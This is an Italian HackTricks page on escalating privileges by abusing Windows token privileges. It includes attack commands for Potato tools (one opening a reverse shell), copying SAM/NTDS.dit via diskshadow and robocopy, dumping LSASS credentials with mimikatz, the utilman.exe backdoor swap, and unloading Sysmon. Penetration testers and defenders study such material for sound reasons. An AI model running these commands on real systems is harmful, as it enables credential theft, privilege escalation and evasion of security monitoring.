# Abuso dei token

{{#include ../../banners/hacktricks-training.md}}

## Token

Se **non sai cosa sono i Windows Access Tokens**, leggi questa pagina prima di continuare:


{{#ref}}
access-tokens.md
{{#endref}}

**Potresti essere in grado di fare privilege escalation abusando dei token che già possiedi**

### SeImpersonatePrivilege

Questo privilegio, posseduto da qualsiasi processo, consente l'impersonation (ma non la creazione) di qualsiasi token, a condizione che sia possibile ottenere un handle ad esso. Un token con privilegi elevati può essere acquisito da un servizio Windows (DCOM) inducendolo a eseguire l'autenticazione NTLM verso un exploit, consentendo successivamente l'esecuzione di un processo con privilegi SYSTEM.<sup>[[2]](#references)</sup> Questa vulnerabilità può essere sfruttata utilizzando vari tool, come [juicy-potato](https://github.com/ohpe/juicy-potato), [RogueWinRM](https://github.com/antonioCoco/RogueWinRM) (che richiede che winrm sia disabilitato), [SweetPotato](https://github.com/CCob/SweetPotato) e [PrintSpoofer](https://github.com/itm4n/PrintSpoofer).

Note moderne per operatori:

- **JuicyPotato è legacy**: su Windows 10 1809+/Server 2019+, preferisci **GodPotato**, **SigmaPotato**, **PrintNotifyPotato**, **RoguePotato**, **SharpEfsPotato/EfsPotato** o **PrintSpoofer**, a seconda della superficie RPC/COM ancora raggiungibile.
- Se hai compromesso un servizio in esecuzione come **`LOCAL SERVICE`** o **`NETWORK SERVICE`** e `whoami /priv` mostra un **filtered token** senza `SeImpersonatePrivilege`/`SeAssignPrimaryTokenPrivilege`, recupera prima il **default privilege set** dell'account (ad esempio con **FullPowers**) e poi riprova con la famiglia potato.<sup>[[3]](#references)</sup>
- Alcuni fork più recenti sono più pratici per gli operatori rispetto ai tool originali. Ad esempio, **SigmaPotato** aggiunge l'esecuzione tramite reflection/in-memory e la compatibilità con le versioni moderne di Windows, mentre **PrintNotifyPotato** abusa del servizio COM PrintNotify ed è spesso utile quando il percorso classico dello Spooler è disabilitato.
```cmd
FullPowers.exe -c "cmd /c whoami /priv" -z
GodPotato.exe -cmd "cmd /c whoami"
SigmaPotato.exe --revshell <ip> <port>
PrintNotifyPotato.exe whoami
```
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}


{{#ref}}
juicypotato.md
{{#endref}}

### SeAssignPrimaryPrivilege

È molto simile a **SeImpersonatePrivilege** e utilizza lo **stesso metodo** per ottenere un token privilegiato.\
Questo privilegio consente quindi di **assegnare un primary token** a un processo nuovo o sospeso. Con il token di impersonation privilegiato è possibile derivare un primary token (DuplicateTokenEx).\
Con il token è possibile creare un **nuovo processo** con 'CreateProcessAsUser', oppure creare un processo sospeso e **impostare il token** (in generale, non è possibile modificare il primary token di un processo in esecuzione).<sup>[[2]](#references)</sup>

### SeTcbPrivilege

Se questo token è abilitato, è possibile utilizzare **KERB_S4U_LOGON** per ottenere un **impersonation token** per qualsiasi altro utente senza conoscerne le credenziali, **aggiungere un gruppo arbitrario** (admins) al token, impostare il **livello di integrità** del token su "**medium**" e assegnare questo token al **thread corrente** (SetThreadToken).<sup>[[2]](#references)</sup>

### SeBackupPrivilege

Grazie a questo privilegio, il sistema concede il controllo di **accesso in lettura** a qualsiasi file (limitato alle operazioni di lettura). Viene utilizzato per **leggere gli hash delle password degli account Administrator locali** dal registro, dopodiché strumenti come "**psexec**" o "**wmiexec**" possono essere utilizzati con l'hash (tecnica Pass-the-Hash). Tuttavia, questa tecnica non funziona in due condizioni: quando l'account Administrator locale è disabilitato oppure quando è applicata una policy che rimuove i diritti amministrativi dagli Administrator locali che si connettono in remoto.<sup>[[2]](#references)</sup>\
In pratica, il workflow integrato più affidabile è solitamente **VSS + `robocopy /b`**: creare/esporre una shadow copy, quindi copiare `SAM`/`SYSTEM` o `NTDS.dit` in **modalità backup**, aggirando le ACL dei file.<sup>[[4]](#references)</sup>
```cmd
:: shadow.txt
set context persistent nowriters
add volume c: alias tk
create
expose %tk% z:

:: then copy sensitive files from the snapshot
diskshadow /s shadow.txt
robocopy /b z:\Windows\System32\Config C:\temp SAM SYSTEM SECURITY
robocopy /b z:\Windows\NTDS C:\temp ntds.dit
```
Puoi **abusare di questo privilegio** con:

- [https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Acl-FullControl.ps1)
- [https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)
- seguendo **IppSec** in [https://www.youtube.com/watch?v=IfCysW0Od8w\&t=2610\&ab_channel=IppSec](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610&ab_channel=IppSec)
- Oppure come spiegato nella sezione **escalating privileges with Backup Operators** di:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### SeRestorePrivilege

Questo privilegio fornisce **accesso in scrittura** a qualsiasi file di sistema, indipendentemente dalla Access Control List (ACL) del file. Offre numerose possibilità di escalation, tra cui la capacità di **modificare i servizi**, eseguire DLL Hijacking e impostare **debugger** tramite Image File Execution Options, oltre a varie altre tecniche.<sup>[[2]](#references)</sup>

### SeCreateTokenPrivilege

SeCreateTokenPrivilege è un'autorizzazione potente, particolarmente utile quando un utente possiede la capacità di impersonare token, ma anche in assenza di SeImpersonatePrivilege. Questa capacità dipende dalla possibilità di impersonare un token che rappresenta lo stesso utente e il cui livello di integrità non supera quello del processo corrente.<sup>[[2]](#references)</sup>

**Punti chiave:**

- **Impersonation senza SeImpersonatePrivilege:** è possibile sfruttare SeCreateTokenPrivilege per l'EoP impersonando token in condizioni specifiche.
- **Condizioni per l'impersonation dei token:** per un'impersonation riuscita, il token di destinazione deve appartenere allo stesso utente e avere un livello di integrità inferiore o uguale al livello di integrità del processo che tenta l'impersonation.
- **Creazione e modifica degli impersonation token:** gli utenti possono creare un impersonation token e potenziarlo aggiungendo il SID (Security Identifier) di un gruppo privilegiato.

### SeLoadDriverPrivilege

Questo privilegio consente di **caricare e scaricare device driver** creando una voce del registro con valori specifici per `ImagePath` e `Type`. Poiché l'accesso diretto in scrittura a `HKLM` (HKEY_LOCAL_MACHINE) è limitato, è necessario utilizzare `HKCU` (HKEY_CURRENT_USER). Tuttavia, affinché `HKCU` sia riconoscibile dal kernel per la configurazione del driver, è necessario seguire un percorso specifico.<sup>[[2]](#references)</sup>

L'uso offensivo moderno consiste solitamente nel **BYOVD** (bring your own vulnerable driver): caricare un **kernel driver firmato ma vulnerabile** e quindi utilizzare i relativi IOCTL per disabilitare le protezioni o ottenere l'esecuzione di codice nel kernel. Tieni presente che nelle build recenti di Windows 11/Server la **Microsoft vulnerable driver blocklist** e/o **HVCI/Memory Integrity** spesso compromettono le vecchie catene pubbliche, quindi gli esempi classici in stile `szkg64.sys` non sono più universalmente affidabili.

Questo percorso è `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName`, dove `<RID>` è il Relative Identifier dell'utente corrente. All'interno di `HKCU`, è necessario creare l'intero percorso e impostare due valori:<sup>[[2]](#references)</sup>

- `ImagePath`, ovvero il percorso del binary da eseguire
- `Type`, con valore `SERVICE_KERNEL_DRIVER` (`0x00000001`).

**Passaggi da seguire:**

1. Accedere a `HKCU` invece di `HKLM` a causa dell'accesso in scrittura limitato.
2. Creare il percorso `\Registry\User\<RID>\System\CurrentControlSet\Services\DriverName` all'interno di `HKCU`, dove `<RID>` rappresenta il Relative Identifier dell'utente corrente.
3. Impostare `ImagePath` sul percorso di esecuzione del binary.
4. Assegnare a `Type` il valore `SERVICE_KERNEL_DRIVER` (`0x00000001`).
```python
# Example Python code to set the registry values
import winreg as reg

# Define the path and values
path = r'Software\YourPath\System\CurrentControlSet\Services\DriverName' # Adjust 'YourPath' as needed
key = reg.OpenKey(reg.HKEY_CURRENT_USER, path, 0, reg.KEY_WRITE)
reg.SetValueEx(key, "ImagePath", 0, reg.REG_SZ, "path_to_binary")
reg.SetValueEx(key, "Type", 0, reg.REG_DWORD, 0x00000001)
reg.CloseKey(key)
```
Altri modi per abusare di questo privilegio sono descritti in [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges#seloaddriverprivilege)

### SeTakeOwnershipPrivilege

È simile a **SeRestorePrivilege**. La sua funzione principale consente a un processo di **assumere la proprietà di un oggetto**, aggirando il requisito di accesso discrezionale esplicito tramite la concessione dei diritti di accesso WRITE_OWNER. Il processo consiste innanzitutto nell'acquisire la proprietà della chiave di registro interessata per poterla modificare, quindi nell'alterare la DACL per abilitare le operazioni di scrittura.<sup>[[2]](#references)</sup>
```bash
takeown /f 'C:\some\file.txt' #Now the file is owned by you
icacls 'C:\some\file.txt' /grant <your_username>:F #Now you have full access
# Use this with files that might contain credentials such as
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software
%WINDIR%\repair\security
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
c:\inetpub\wwwwroot\web.config
```
### SeDebugPrivilege

Questo privilegio consente di eseguire il **debug di altri processi**, inclusa la lettura e la scrittura nella memoria. Con questo privilegio è possibile utilizzare diverse strategie di memory injection, in grado di eludere la maggior parte delle soluzioni antivirus e di host intrusion prevention.<sup>[[2]](#references)</sup>

Su Windows moderni, ricordate che `SeDebugPrivilege` è solitamente sufficiente per aprire **processi SYSTEM non protetti** e duplicarne i token, ma **non garantisce** di poter interagire con **LSASS**. Se **RunAsPPL / LSA Protection** è abilitato, i processi non protetti non possono leggere o eseguire injection in LSASS anche se `SeDebugPrivilege` è presente. In tal caso, effettuate il furto di un token da un altro processo SYSTEM non PPL oppure concatenatelo con un PPL bypass/BYOVD, invece di presumere che `procdump` funzionerà. Per un esempio completo di copia del token utilizzando `SeDebugPrivilege` + `SeImpersonatePrivilege`, consultate [questa pagina](sedebug-+-seimpersonate-copy-token.md).

#### Dump della memoria

È possibile utilizzare [ProcDump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) della [SysInternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) per **catturare la memoria di un processo**. In particolare, ciò può essere applicato al processo **Local Security Authority Subsystem Service (**[**LSASS**](https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service)**)**, responsabile della memorizzazione delle credenziali degli utenti dopo che questi hanno effettuato correttamente l'accesso a un sistema.

È quindi possibile caricare questo dump in mimikatz per ottenere le password:
```
mimikatz.exe
mimikatz # log
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```
#### RCE

Se vuoi ottenere una shell `NT SYSTEM`, puoi usare:

- [**SeDebugPrivilege-Exploit (C++)**](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)
- [**SeDebugPrivilegePoC (C#)**](https://github.com/daem0nc0re/PrivFu/tree/main/PrivilegedOperations/SeDebugPrivilegePoC)
- [**psgetsys.ps1 (Powershell Script)**](https://raw.githubusercontent.com/decoder-it/psgetsystem/master/psgetsys.ps1)
```bash
# Get the PID of a process running as NT SYSTEM
import-module psgetsys.ps1; [MyProcess]::CreateProcessFromParent(<system_pid>,<command_to_execute>)
```
### SeManageVolumePrivilege

Questo diritto (esecuzione delle attività di manutenzione dei volumi) consente di aprire handle dei dispositivi volume raw (ad es., \\.\C:) per eseguire operazioni di I/O diretto sul disco che bypassano gli ACL NTFS. Con questo diritto è possibile copiare i byte di qualsiasi file presente nel volume leggendo i blocchi sottostanti, consentendo l’arbitrary file read di materiale sensibile (ad es., chiavi private della macchina in %ProgramData%\Microsoft\Crypto\, hive del registro, SAM/NTDS tramite VSS).<sup>[[5]](#references)</sup> È particolarmente impattante sui server CA, dove l’exfiltration della chiave privata della CA consente di forgiare un Golden Certificate per impersonare qualsiasi principal.<sup>[[6]](#references)</sup>

Vedi le tecniche e le mitigazioni dettagliate:

{{#ref}}
semanagevolume-perform-volume-maintenance-tasks.md
{{#endref}}

## Controllare i privilegi
```
whoami /priv
```
I **token che appaiono come Disabled** possono solitamente essere abilitati, quindi spesso è possibile abusare sia dei privilegi _Enabled_ che di quelli _Disabled_.

### Abilitare tutti i token

Se disponi di privilegi disabilitati, puoi usare lo script [**EnableAllTokenPrivs.ps1**](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1) per abilitare tutti i token:
```bash
.\EnableAllTokenPrivs.ps1
whoami /priv
```
Oppure lo **script** incorporato in questo [**post**](https://www.leeholmes.com/adjusting-token-privileges-in-powershell/).

## Tabella

Cheat sheet completa dei privilegi dei token disponibile su [https://github.com/gtworek/Priv2Admin](https://github.com/gtworek/Priv2Admin); il riepilogo seguente elenca solo i modi diretti per sfruttare il privilegio al fine di ottenere una sessione admin o leggere file sensibili.<sup>[[1]](#references)</sup>

| Privilegio                  | Impatto      | Strumento                    | Percorso di esecuzione                                                                                                                                                                                                                                                                                                                                     | Note                                                                                                                                                                                                                                                                                                                        |
| -------------------------- | ----------- | ----------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **`SeAssignPrimaryToken`** | _**Admin**_ | strumento di terze parti          | _"Consentirebbe a un utente di impersonare token ed eseguire privesc a nt system usando strumenti come potato.exe, rottenpotato.exe e juicypotato.exe"_                                                                                                                                                                                                      | Grazie ad [Aurélien Chalot](https://twitter.com/Defte_) per l'aggiornamento. Presto proverò a riformularlo in una forma più simile a una ricetta.                                                                                                                                                                                         |
| **`SeBackup`**             | **Minaccia**  | _**comandi integrati**_ | Leggere file sensibili con `robocopy /b` o helper di copia dedicati compatibili con SeBackup.                                                                                                                                                                                                                                                                 | <p>- Utile per `SAM`/`SYSTEM`, `SECURITY`, `NTDS.dit` e talvolta `%WINDIR%\MEMORY.DMP`.<br><br>- `robocopy` è pratico, ma i cmdlet/API SeBackup dedicati sono spesso più flessibili per i file bloccati/aperti.</p>                                                                                                   |
| **`SeCreateToken`**        | _**Admin**_ | strumento di terze parti          | Creare un token arbitrario, inclusi i diritti di amministratore locale, con `NtCreateToken`.                                                                                                                                                                                                                                                                          |                                                                                                                                                                                                                                                                                                                                |
| **`SeDebug`**              | _**Admin**_ | **PowerShell**          | Duplicare un token SYSTEM **non-PPL** o eseguire il dump della memoria da un processo non protetto.                                                                                                                                                                                                                                                                 | <p>Il dumping di LSASS è comunemente bloccato se RunAsPPL/LSA Protection è abilitato.</p><p>Script disponibile su [FuzzySecurity](https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1)</p>                                                                                                               |
| **`SeImpersonate`**        | _**Admin**_ | strumento di terze parti          | Usare la **famiglia Potato** / l'impersonificazione tramite named pipe per avviare SYSTEM (`PrintSpoofer`, `RoguePotato`, `GodPotato`, `SigmaPotato`, `PrintNotifyPotato`, ecc.).                                                                                                                                                                                    | <p>È particolarmente pratico da account di servizio come IIS APPPOOL, MSSQL, attività pianificate o qualsiasi contesto che possieda già `SeImpersonatePrivilege`.</p>                                                                                                                                                                            |
| **`SeLoadDriver`**         | _**Admin**_ | strumento di terze parti          | <p>1. Caricare un driver del kernel firmato ma vulnerabile (BYOVD)<br>2. Usare gli IOCTL del driver per ottenere R/W sul kernel, disabilitare gli strumenti di sicurezza o ottenere l'accesso a SYSTEM<br><br>In alternativa, il privilegio può essere usato per scaricare driver legati alla sicurezza con il comando integrato <code>fltMC</code>, ad esempio <code>fltMC sysmondrv</code></p>                     | <p>I driver pubblici più vecchi, come <code>szkg64.sys</code>, vengono sempre più spesso bloccati sulle versioni moderne di Windows dalla blocklist dei driver vulnerabili / HVCI.</p>                                                                                                                                                                               |
| **`SeRestore`**            | _**Admin**_ | **PowerShell**          | <p>1. Avviare PowerShell/ISE con il privilegio SeRestore presente.<br>2. Abilitare il privilegio con <a href="https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1">Enable-SeRestorePrivilege</a>).<br>3. Rinominare utilman.exe in utilman.old<br>4. Rinominare cmd.exe in utilman.exe<br>5. Bloccare la console e premere Win+U</p> | <p>L'attacco può essere rilevato da alcuni software AV.</p><p>Un metodo alternativo consiste nel sostituire i binari dei servizi archiviati in "Program Files" usando lo stesso privilegio</p>                                                                                                                                                            |
| **`SeTakeOwnership`**      | _**Admin**_ | _**comandi integrati**_ | <p>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icacls.exe "%windir%\system32" /grant "%username%":F</code><br>3. Rinominare cmd.exe in utilman.exe<br>4. Bloccare la console e premere Win+U</p>                                                                                                                                       | <p>L'attacco può essere rilevato da alcuni software AV.</p><p>Un metodo alternativo consiste nel sostituire i binari dei servizi archiviati in "Program Files" usando lo stesso privilegio.</p>                                                                                                                                                           |
| **`SeTcb`**                | _**Admin**_ | strumento di terze parti          | <p>Manipolare i token per includere i diritti di amministratore locale. Potrebbe richiedere SeImpersonate.</p><p>Da verificare.</p>                                                                                                                                                                                                                                     |                                                                                                                                                                                                                                                                                                                                |

## Riferimenti

- [1] [gtworek/Priv2Admin - percorsi di exploitation dai privilegi Windows all'admin](https://github.com/gtworek/Priv2Admin)
- [2] [Abusing Token Privileges For LPE](https://github.com/hatRiot/token-priv/blob/master/abusing_token_eop_1.0.txt)
- [3] [itm4n – Ridatemi i miei privilegi! Per favore?](https://itm4n.github.io/localservice-privileges/)
- [4] [Microsoft – Robocopy (la modalità di backup `/b` bypassa i controlli ACL di file/cartelle)](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [5] [Microsoft – Eseguire attività di manutenzione dei volumi (SeManageVolumePrivilege)](https://learn.microsoft.com/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/perform-volume-maintenance-tasks)
- [6] [0xdf – HTB: Certificate (SeManageVolumePrivilege → esfiltrazione della chiave CA → Golden Certificate)](https://0xdf.gitlab.io/2025/10/04/htb-certificate.html)

{{#include ../../banners/hacktricks-training.md}}
